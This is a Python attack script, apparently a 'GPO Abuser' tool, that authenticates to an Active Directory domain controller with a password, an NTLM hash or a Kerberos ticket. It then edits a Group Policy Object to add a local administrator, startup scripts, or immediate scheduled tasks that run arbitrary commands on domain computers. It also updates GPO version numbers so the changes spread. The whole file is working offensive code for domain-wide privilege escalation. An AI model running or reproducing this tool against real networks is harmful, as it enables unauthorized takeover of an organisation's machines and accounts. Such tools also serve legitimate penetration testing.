import argparse
import binascii
import logging
import os
import re
import sys

from gpopy.gpo import GPO
from impacket.smbconnection import SMBConnection
from impacket.examples.utils import parse_credentials

"""
    Capture command line arguments
"""
parser = argparse.ArgumentParser(add_help=True, description="GPO Abuser")
# Domain + Creds + Target GPO
parser.add_argument('target', action='store', help='domain/username[:password]')
parser.add_argument('-hash', action='store', metavar="LMHASH:NTHASH", help='NTLM hashes, LMHASH:NTHASH format')
parser.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                    '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                    'cannot be found, it will use the ones specified in the command '
                                                    'line')
parser.add_argument('-ccache', action='store', help='ccache file name (must be in local directory)')
parser.add_argument('-dc-ip', action='store', help='Domain controller IP or hostname')
parser.add_argument('-gpo-id', action='store', metavar='GPO_ID', help='GPO to update')

# General options
parser.add_argument('-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
parser.add_argument('-v', action='count', default=0, help='Verbosity (-v, -vv, -vvv)')

# Attack selection:
parser.add_argument('-add-localadmin', action='store_true', help='Add new local admin')
# parser.add_argument('-add-userrights', action='store_true', help='Add rights to a user')
parser.add_argument('-add-userscript', action='store_true', help='Add new user startup script')
parser.add_argument('-add-computerscript', action='store_true', help='Add new computer startup script')
parser.add_argument('-add-usertask', action='store_true', help='Add immediate task for user object takeover')
parser.add_argument('-add-computertask', action='store_true', help='Add immediate task for computer object takeover')

# Immediate task options
parser.add_argument('-description', action='store', help='Task description (Default: Empty)')
parser.add_argument('-command', action='store', help='Command to run via the immediate task, if blank defaults to '
                                                     'adding user')
parser.add_argument('-arguments', action='store', help='Command arguments for the immediate task')
parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')
parser.add_argument('-aU', action='store', help='Username of local admin to create via scheduled task')
parser.add_argument('-aP', action='store', help='Password of local admin to create via scheduled task')
parser.add_argument('-task-name', action='store', help='New immediate task name')
parser.add_argument('-author', action='store', help='New immediate task author')

# Filtered task options
parser.add_argument('-filter', action='store_true', help='Enable target filtering')
parser.add_argument('-target-dns-name', action='store', help='Target computer DNS name for filtered task')
parser.add_argument('-target-username', action='store', help='Target username for filtered immediate task')
parser.add_argument('-target-usersid', action='store', help='Target user SID for filtered immediate task')

# Startup script options
parser.add_argument('-script-name', action='store', help='New startup script name')
parser.add_argument('-script-contents', action='store', help='New startup script contents')

# Add local admin options
parser.add_argument('-user-account', action='store', help='User to add as local admin')

# TODO: Add config + process for adding user rights

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

"""
    Configure logging 
"""
if options.v == 1:
    logging.basicConfig(level=logging.ERROR)
elif options.v == 2:
    logging.basicConfig(level=logging.WARNING)
elif options.v == 3:
    logging.basicConfig(level=logging.INFO)
else:
    logging.basicConfig(level=logging.CRITICAL)
logging.basicConfig(format='[!] - %(levelname)s - %(message)s')

# Did the user supply a GPO id?
if not options.gpo_id:
    parser.print_help()
    sys.exit(1)

domain, username, password = parse_credentials(options.target)

if options.dc_ip:
    dc_ip = options.dc_ip
else:
    dc_ip = domain

if domain == '':
    logging.critical('Domain should be specified!')
    sys.exit(1)

if password == '' and username != '':
    from getpass import getpass

    password = getpass("Password:")
elif options.hash is not None:
    if ":" not in options.hash:
        logging.critical("Hash format incorrect!")
        sys.exit(1)

if options.ldaps:
    protocol = 'ldaps'
else:
    protocol = 'ldap'

# What authentication method are we using?
if options.k:
    if not options.ccache:
        logging.error("-ccache required for Kerberos Auth")
        sys.exit(1)
    url = '{}+kerberos-ccache://{}\\{}:{}@{}/?dc={}'.format(protocol, domain, username, options.ccache, dc_ip,
                                                            dc_ip)
elif password != '':
    url = '{}+ntlm-password://{}\\{}:{}@{}'.format(protocol, domain, username, password, dc_ip)
    lmhash, nthash = "", ""
else:
    url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hash.split(":")[1], dc_ip)
    lmhash, nthash = options.hash.split(":")


def true_xor(*args):
    return sum(args) == 1


# Has the user specified more than one type of attack?
if not true_xor(options.add_localadmin, options.add_userscript, options.add_computerscript,
                options.add_usertask, options.add_computertask):
    logging.critical("Please choose only one attack!")
    sys.exit(1)

"""
    Has the user selected valid arguments?
"""
if options.add_localadmin:
    if not options.user_account:
        logging.critical("-user-account must be set for adding a local admin!")
        sys.exit(1)

if options.add_userscript or options.add_computerscript:
    if not options.script_name:
        options.script_name = "SCRIPT_" + binascii.b2a_hex(os.urandom(4)).decode('ascii')
    if not options.script_contents:
        logging.critical("Script contents required for adding scripts!")
        sys.exit(1)

if options.add_computertask or options.add_usertask:
    if not options.task_name:
        options.task_name = "TASK_" + binascii.b2a_hex(os.urandom(4)).decode('ascii')
    if options.add_usertask:
        if not options.author:
            logging.critical("User tasks require an author to be set!")
            sys.exit(1)
    if options.filter and options.add_computertask:
        if not options.target_dns_name:
            logging.critical("-target-dns-name must be set for a filtered computer task!")
            sys.exit(1)

    if options.add_usertask and options.filter:
        if not options.target_username and not options.target_usersid:
            logging.critical("Must set either -target-username or -target-usersid for filtered user task!")
            sys.exit(1)


try:
    logging.info("Attempting SMB connection as {} to {}".format(username, dc_ip))
    smb_session = SMBConnection(dc_ip, dc_ip)
    if options.k:
        smb_session.kerberosLogin(user=username, password='', domain=domain, kdcHost=dc_ip)
    else:
        smb_session.login(username, password, domain, lmhash, nthash)
except Exception as e:
    logging.error("SMB connection error", exc_info=True)
    sys.exit(1)

try:
    gpo = GPO(smb_session)
    # User wants to add a computer task or user task
    if options.add_computertask or options.add_usertask:
        task_name = gpo.update_scheduled_task(
            domain=domain,
            gpo_id=options.gpo_id,
            description=options.description,
            force=options.f,
            admin_username=options.aU,
            admin_password=options.aP,
            command=options.command,
            arguments=options.arguments,
            task_name=options.task_name,
            author=options.author,
            computer_task=options.add_computertask
        )
        if task_name:
            if gpo.update_versions(url, domain, options.gpo_id, gpo_type="computer", extensions=True):
                logging.info("Version updated")
            else:
                logging.error("Error while updating versions")
                sys.exit(1)
            print("ScheduledTask {} created!".format(task_name))
    # User wants to create a new localadmin
    if options.add_localadmin:
        gpo.add_local_admin(url, domain, options.gpo_id, options.user_account, options.f)


except Exception as e:
    logging.error("An error occurred. Use -vv for more details", exc_info=True)
